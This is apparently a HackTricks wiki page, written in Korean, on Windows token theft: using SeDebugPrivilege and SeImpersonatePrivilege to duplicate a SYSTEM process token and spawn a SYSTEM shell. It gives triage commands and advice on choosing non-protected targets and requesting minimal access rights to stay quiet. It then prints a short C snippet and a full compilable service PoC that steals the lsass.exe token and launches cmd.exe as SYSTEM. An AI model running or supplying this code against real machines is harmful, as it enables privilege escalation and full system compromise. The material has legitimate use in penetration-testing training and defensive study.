# SeDebug + SeImpersonate - Copy Token

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 이미 **`SeDebugPrivilege`**와 **`SeImpersonatePrivilege`**를 가진 **High Integrity** 컨텍스트가 적절한 **SYSTEM** 프로세스를 열고, **토큰을 복제**한 뒤, 그 토큰으로 **새 프로세스**를 생성하는 **manual token-theft** 변형을 다룹니다.

특권이 있는 admin 프로세스에서 빠르게 `SYSTEM` shell만 필요하다면, 다음도 확인하세요:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

프로세스 핸들 경로는 없지만 **`SeImpersonatePrivilege`**는 있다면, **named-pipe / Potato** 방식이 보통 더 쉽습니다:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Quick triage

token-copy 경로를 시도하기 전에, 현재 프로세스가 이미 유용한 컨텍스트에 있는지 확인하세요:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege"
```
Notes:

- **`SeDebugPrivilege`**는 DACL이 보통 막아도 많은 **non-protected** SYSTEM process를 열 수 있게 해줍니다.
- **`SeImpersonatePrivilege`**는 이후 **`CreateProcessWithTokenW`**를 실용적으로 만들어 줍니다.
- token-copy path가 약하거나 filtered된 SYSTEM token만 준다면, 그냥 **다른 SYSTEM process**에서 steal하세요.

## target process를 신중하게 고르기

이 technique은 보통 **`lsass.exe`**를 대상으로 보여주지만, modern Windows에서는 종종 **잘못된 target**입니다:

- **LSA Protection / RunAsPPL**이 enabled되어 있으면, **`lsass.exe`**는 protected 상태이므로 `SeDebugPrivilege`가 있는 일반 admin process도 여전히 열 수 없습니다.
- **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`**, 또는 초기 **`svchost.exe`** instance 같은 **non-PPL SYSTEM process**를 prefer하세요.
- **Protected process**와 **`System`**, **`csrss.exe`** 같은 일부 special process는 이 technique의 현실적인 user-mode target이 아닙니다.
- elevated 상태로 실행 중인 **Process Hacker / Process Explorer**를 사용해 duplicate하기 전에 target token이 실제로 원하는 privileges를 가지고 있는지 확인하세요.

## 실제로 중요한 API details

많은 public PoC는 **`PROCESS_ALL_ACCESS`**와 **`TOKEN_ALL_ACCESS`**를 요청하지만, 그건 필요 이상으로 noisy합니다. 실제로는:

- target process는 필요한 권한만으로 open하세요(보통 **`PROCESS_QUERY_INFORMATION`** 또는 **`PROCESS_QUERY_LIMITED_INFORMATION`**).
- token은 process creation에 필요한 권한으로 open하세요: **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- **`DuplicateTokenEx(..., TokenPrimary, ...)`**를 사용해 **primary token**을 만드세요; impersonation token만으로는 새 process를 만들 수 없습니다.
- **`CreateProcessWithTokenW`**가 **`1314`**로 실패하면 **`CreateProcessAsUserW`**로 전환하세요.
- **service / Session 0**에서 launch하는 경우, **`CreateProcessWithTokenW`**는 child를 **caller의 session**에 유지한다는 점을 기억하세요. 보이는 desktop shell이 필요하면 **`CreateProcessAsUserW`**를 사용하고 token을 원하는 session으로 옮기세요.

최소한의 modern flow는 다음과 같습니다:
```c
HANDLE hp = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
HANDLE hTok = NULL, hDup = NULL;
OpenProcessToken(hp, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hTok);
DuplicateTokenEx(hTok, MAXIMUM_ALLOWED, NULL,
SecurityImpersonation, TokenPrimary, &hDup);
CreateProcessWithTokenW(hDup, LOGON_WITH_PROFILE,
L"C:\\Windows\\System32\\cmd.exe",
NULL, 0, NULL, NULL, &si, &pi);
```
## Full service PoC

다음 코드는 **`SeDebugPrivilege`와 `SeImpersonatePrivilege` 권한을 악용**해 **SYSTEM으로 실행 중인 프로세스**에서, 그리고 **모든 token privileges**를 가진 token을 복사합니다. 이 경우, 코드는 **Windows service binary**로 컴파일해 사용하여 이 primitive가 동작하는지 확인할 수 있습니다.

**승격이 발생하는 code의 핵심 부분**은 **`Exploit`** function 안에 있습니다. 그 function 안에서는 **`lsass.exe`**를 찾고, 그 **token을 복사**한 다음, 그 token을 사용해 복사된 token의 모든 권한으로 새 **`cmd.exe`**를 실행합니다.

modern hosts에서는 종종 **`lsass.exe`**를 **`winlogon.exe`**, **`wininit.exe`**, 또는 **`services.exe`** 같은 다른 **non-PPL SYSTEM process**로 바꾸고 싶을 것입니다.

SYSTEM으로 실행되며 token privileges의 전부 또는 대부분을 가진 다른 processes는 **`services.exe`**, **`svchost.exe`**(초기 실행된 일부), **`wininit.exe`**, **`csrss.exe`** 등입니다. 일반적으로 **protected process**에서 token을 복사할 수 없다는 점을 기억하세요.
```c
// From https://cboard.cprogramming.com/windows-programming/106768-running-my-program-service.html
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#pragma comment (lib, "advapi32")

TCHAR* serviceName = TEXT("TokenDanceSrv");
SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
HANDLE stopServiceEvent = 0;

//This function will find the pid of a process by name
int FindTarget(const char *procname) {

HANDLE hProcSnap;
PROCESSENTRY32 pe32;
int pid = 0;

hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

pe32.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(hProcSnap, &pe32)) {
CloseHandle(hProcSnap);
return 0;
}

while (Process32Next(hProcSnap, &pe32)) {
if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
pid = pe32.th32ProcessID;
break;
}
}

CloseHandle(hProcSnap);

return pid;
}


int Exploit(void) {

HANDLE hSystemToken, hSystemProcess;
HANDLE dupSystemToken = NULL;
HANDLE hProcess, hThread;
STARTUPINFOA si;
PROCESS_INFORMATION pi;
int pid = 0;


ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));

// open high privileged process
if ( pid = FindTarget("lsass.exe") )
hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
else
return -1;

// extract high privileged token
if (!OpenProcessToken(hSystemProcess, TOKEN_ALL_ACCESS, &hSystemToken)) {
CloseHandle(hSystemProcess);
return -1;
}

// make a copy of a token
DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupSystemToken);

// and spawn a new process with higher privs
CreateProcessAsUserA(dupSystemToken, "C:\\windows\\system32\\cmd.exe",
NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

return 0;
}


void WINAPI ServiceControlHandler( DWORD controlCode ) {
switch ( controlCode ) {
case SERVICE_CONTROL_SHUTDOWN:
case SERVICE_CONTROL_STOP:
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

SetEvent( stopServiceEvent );
return;

case SERVICE_CONTROL_PAUSE:
break;

case SERVICE_CONTROL_CONTINUE:
break;

case SERVICE_CONTROL_INTERROGATE:
break;

default:
break;
}
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}

void WINAPI ServiceMain( DWORD argc, TCHAR* argv[] ) {
// initialise service status
serviceStatus.dwServiceType = SERVICE_WIN32;
serviceStatus.dwCurrentState = SERVICE_STOPPED;
serviceStatus.dwControlsAccepted = 0;
serviceStatus.dwWin32ExitCode = NO_ERROR;
serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
serviceStatus.dwCheckPoint = 0;
serviceStatus.dwWaitHint = 0;

serviceStatusHandle = RegisterServiceCtrlHandler( serviceName, ServiceControlHandler );

if ( serviceStatusHandle ) {
// service is starting
serviceStatus.dwCurrentState = SERVICE_START_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do initialisation here
stopServiceEvent = CreateEvent( 0, FALSE, FALSE, 0 );

// running
serviceStatus.dwControlsAccepted |= (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_RUNNING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

Exploit();
WaitForSingleObject( stopServiceEvent, -1 );

// service was stopped
serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
SetServiceStatus( serviceStatusHandle, &serviceStatus );

// do cleanup here
CloseHandle( stopServiceEvent );
stopServiceEvent = 0;

// service is now stopped
serviceStatus.dwControlsAccepted &= ~(SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN);
serviceStatus.dwCurrentState = SERVICE_STOPPED;
SetServiceStatus( serviceStatusHandle, &serviceStatus );
}
}


void InstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CREATE_SERVICE );

if ( serviceControlManager ) {
TCHAR path[ _MAX_PATH + 1 ];
if ( GetModuleFileName( 0, path, sizeof(path)/sizeof(path[0]) ) > 0 ) {
SC_HANDLE service = CreateService( serviceControlManager,
serviceName, serviceName,
SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, path,
0, 0, 0, 0, 0 );
if ( service )
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

void UninstallService() {
SC_HANDLE serviceControlManager = OpenSCManager( 0, 0, SC_MANAGER_CONNECT );

if ( serviceControlManager ) {
SC_HANDLE service = OpenService( serviceControlManager,
serviceName, SERVICE_QUERY_STATUS | DELETE );
if ( service ) {
SERVICE_STATUS serviceStatus;
if ( QueryServiceStatus( service, &serviceStatus ) ) {
if ( serviceStatus.dwCurrentState == SERVICE_STOPPED )
DeleteService( service );
}
CloseServiceHandle( service );
}
CloseServiceHandle( serviceControlManager );
}
}

int _tmain( int argc, TCHAR* argv[] )
{
if ( argc > 1 && lstrcmpi( argv[1], TEXT("install") ) == 0 ) {
InstallService();
}
else if ( argc > 1 && lstrcmpi( argv[1], TEXT("uninstall") ) == 0 ) {
UninstallService();
}
else  {
SERVICE_TABLE_ENTRY serviceTable[] = {
{ serviceName, ServiceMain },
{ 0, 0 }
};

StartServiceCtrlDispatcher( serviceTable );
}

return 0;
}
```
## References

- [CreateProcessWithTokenW function (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [Configure added LSA protection (Microsoft Learn)](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
